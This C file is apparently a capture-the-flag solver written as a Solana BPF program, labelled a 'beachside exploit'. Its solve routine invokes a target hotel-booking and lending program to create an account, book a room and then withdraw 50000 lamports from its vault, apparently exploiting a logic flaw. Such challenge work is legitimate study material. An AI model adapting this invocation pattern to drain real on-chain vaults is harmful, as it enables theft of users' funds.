/**
 * @brief C-based Helloworld BPF program
 */
#include <solana_sdk.h>
#include "shared/clock.h"
#include "shared/program.h"

#define CREATE_OPCODE 0
#define DEPOSIT_OPCODE 1
#define WITHDRAW_OPCODE 2
#define BOOK_OPCODE 3
#define SLEEP_OPCODE 4

#define SYSTEM 0
#define CLOCK 1
#define USER 2
#define VAULT 3
#define PROGRAM 4
#define LENDING_DATA 5
#define SOLFIRE 6

#define VAULT_SEED 0
#define LENDING_DATA_SEED 1
#define SOLFIRE_SEED 2


typedef struct {
    uint32_t opcode;
    uint8_t seed;
} CreateAccountInstr;

typedef struct {
    uint32_t opcode;
    uint32_t idx;
    uint32_t amt;
} DepositInstr;

typedef struct {
    uint32_t opcode;
    uint32_t idx;
    uint32_t amt;
    uint8_t bump;
} WithdrawInstr;

typedef struct {
    uint32_t opcode;
    uint32_t idx; // room number
    uint32_t nights;
} BookInstr;

typedef struct {
    uint32_t opcode;
    uint32_t idx; // room number
} SleepInstr;


void create_account(SolParameters *params) {
    SolAccountInfo *system      = &params->ka[SYSTEM];
    SolAccountInfo *clock       = &params->ka[CLOCK];
    SolAccountInfo *user        = &params->ka[USER];
    SolAccountInfo *vault       = &params->ka[VAULT];
    SolAccountInfo *program     = &params->ka[PROGRAM];
    SolAccountInfo *lndng_data  = &params->ka[LENDING_DATA];
    SolAccountInfo *solfire     = &params->ka[SOLFIRE];

    uint8_t vault_seed          = params->data[VAULT_SEED];
    uint8_t lndng_data_seed     = params->data[LENDING_DATA_SEED];
    uint8_t solfire_seed        = params->data[SOLFIRE_SEED];

    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = lndng_data->key, .is_writable = true, .is_signer = false},
        { .pubkey = program->key, .is_writable = false, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true}
    };

    CreateAccountInstr ix_bytes = {
        .opcode = CREATE_OPCODE,
        .seed = lndng_data_seed
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void deposit(SolParameters *params, uint32_t idx, uint32_t lamports) {
    SolAccountInfo *system      = &params->ka[SYSTEM];
    SolAccountInfo *clock       = &params->ka[CLOCK];
    SolAccountInfo *user        = &params->ka[USER];
    SolAccountInfo *vault       = &params->ka[VAULT];
    SolAccountInfo *program     = &params->ka[PROGRAM];
    SolAccountInfo *lndng_data  = &params->ka[LENDING_DATA];
    SolAccountInfo *solfire     = &params->ka[SOLFIRE];

    uint8_t vault_seed          = params->data[VAULT_SEED];
    uint8_t lndng_data_seed     = params->data[LENDING_DATA_SEED];
    uint8_t solfire_seed        = params->data[SOLFIRE_SEED];

    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = lndng_data->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false}
    };

    uint8_t seed[1];
    seed[0] = solfire_seed;
    const SolSignerSeed seeds[] = {{seed, SOL_ARRAY_SIZE(seed)}};
    const SolSignerSeeds signers_seeds[] = {{seeds, SOL_ARRAY_SIZE(seeds)}};

    transfer_amount_sys data = { .lamports = 1 };
    DepositInstr ix_bytes = {
        .opcode = DEPOSIT_OPCODE,
        .idx = idx,
        .amt = lamports
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke_signed(
        &instruction,
        params->ka,
        params->ka_num,
        signers_seeds,
        SOL_ARRAY_SIZE(signers_seeds)
    );
}

void withdraw(SolParameters *params, uint32_t idx, uint32_t lamports) {
    SolAccountInfo *system      = &params->ka[SYSTEM];
    SolAccountInfo *clock       = &params->ka[CLOCK];
    SolAccountInfo *user        = &params->ka[USER];
    SolAccountInfo *vault       = &params->ka[VAULT];
    SolAccountInfo *program     = &params->ka[PROGRAM];
    SolAccountInfo *lndng_data  = &params->ka[LENDING_DATA];
    SolAccountInfo *solfire     = &params->ka[SOLFIRE];

    uint8_t vault_seed          = params->data[VAULT_SEED];
    uint8_t lndng_data_seed     = params->data[LENDING_DATA_SEED];
    uint8_t solfire_seed        = params->data[SOLFIRE_SEED];

    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = system->key, .is_writable = false, .is_signer = false},
        { .pubkey = lndng_data->key, .is_writable = true, .is_signer = false},
        { .pubkey = user->key, .is_writable = true, .is_signer = true},
        { .pubkey = vault->key, .is_writable = true, .is_signer = false}
    };

    uint8_t seed[1];
    seed[0] = solfire_seed;
    const SolSignerSeed seeds[] = {{seed, SOL_ARRAY_SIZE(seed)}};
    const SolSignerSeeds signers_seeds[] = {{seeds, SOL_ARRAY_SIZE(seeds)}};

    transfer_amount_sys data = { .lamports = 1 };
    WithdrawInstr ix_bytes = {
        .opcode = WITHDRAW_OPCODE,
        .idx = idx,
        .amt = lamports,
        .bump = vault_seed
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke_signed(
        &instruction,
        params->ka,
        params->ka_num,
        signers_seeds,
        SOL_ARRAY_SIZE(signers_seeds)
    );
}

void book(SolParameters *params, uint32_t idx, uint32_t nights) {
    SolAccountInfo *system      = &params->ka[SYSTEM];
    SolAccountInfo *clock       = &params->ka[CLOCK];
    SolAccountInfo *user        = &params->ka[USER];
    SolAccountInfo *vault       = &params->ka[VAULT];
    SolAccountInfo *program     = &params->ka[PROGRAM];
    SolAccountInfo *lndng_data  = &params->ka[LENDING_DATA];
    SolAccountInfo *solfire     = &params->ka[SOLFIRE];

    uint8_t vault_seed          = params->data[VAULT_SEED];
    uint8_t lndng_data_seed     = params->data[LENDING_DATA_SEED];
    uint8_t solfire_seed        = params->data[SOLFIRE_SEED];

    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = lndng_data->key, .is_writable = true, .is_signer = false},
    };

    transfer_amount_sys data = { .lamports = 1 };
    BookInstr ix_bytes = {
        .opcode = BOOK_OPCODE,
        .idx = idx,
        .nights = nights
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

void sleep(SolParameters *params, uint32_t idx) {
    SolAccountInfo *system      = &params->ka[SYSTEM];
    SolAccountInfo *clock       = &params->ka[CLOCK];
    SolAccountInfo *user        = &params->ka[USER];
    SolAccountInfo *vault       = &params->ka[VAULT];
    SolAccountInfo *program     = &params->ka[PROGRAM];
    SolAccountInfo *lndng_data  = &params->ka[LENDING_DATA];
    SolAccountInfo *solfire     = &params->ka[SOLFIRE];

    uint8_t vault_seed          = params->data[VAULT_SEED];
    uint8_t lndng_data_seed     = params->data[LENDING_DATA_SEED];
    uint8_t solfire_seed        = params->data[SOLFIRE_SEED];

    
    SolAccountMeta arguments[] = {
        { .pubkey = clock->key, .is_writable = false, .is_signer = false},
        { .pubkey = lndng_data->key, .is_writable = true, .is_signer = false},
    };

    transfer_amount_sys data = { .lamports = 1 };
    SleepInstr ix_bytes = {
        .opcode = SLEEP_OPCODE,
        .idx = idx
    };

    const SolInstruction instruction = {
        .program_id = program->key,
        .accounts = arguments,
        .account_len = SOL_ARRAY_SIZE(arguments),
        .data = (uint8_t*)&ix_bytes,
        .data_len = sizeof(ix_bytes)
    };

    sol_invoke(
        &instruction,
        params->ka,
        params->ka_num
    );
}

uint64_t solve(SolParameters *params) {
    create_account(params);
    book(params, 1, 6);
    withdraw(params, 1, 50000);
    return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input) {
    sol_log("beachside exploit C program entrypoint");

    SolAccountInfo accounts[7];
    SolParameters params = (SolParameters){.ka = accounts};

    if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
        return ERROR_INVALID_ARGUMENT;
    }

    return solve(&params);
}
